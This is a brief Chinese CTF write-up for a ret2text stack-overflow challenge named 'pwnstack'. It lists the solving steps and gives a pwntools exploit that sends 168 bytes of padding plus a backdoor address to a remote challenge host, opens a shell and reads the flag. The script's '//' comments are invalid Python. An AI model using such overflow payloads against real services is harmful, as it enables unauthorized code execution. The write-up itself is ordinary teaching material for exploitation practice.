

[TOC]



# pwn练习题

## 经典栈溢出之 ret2text / ret2win

###  pwnstack

解题步骤

1.检查程序安全机制

```shell
checksec pwn2
```

2.IDA逆向分析

3.找到后门函数的开始地址

4.编写exp

```python
from pwn import *
p=remote("61.147.171.105",59432)
payload=b'a'*0xa8+p64(0x400762)
//b:表示'a'*0xa8是字节串
//p64():把 64-bit 整数变成 8 个字节的 bytes
//0xa8:观察到char buf[160];之后再加上保存的 RBP（8 字节），总偏移为 160 + 8 = 168（0xa8）
p.sendline(payload)
p.interactive()
```

5.ls查看文件，然后发现有一个叫flag的文件，cat查看文件，得到flag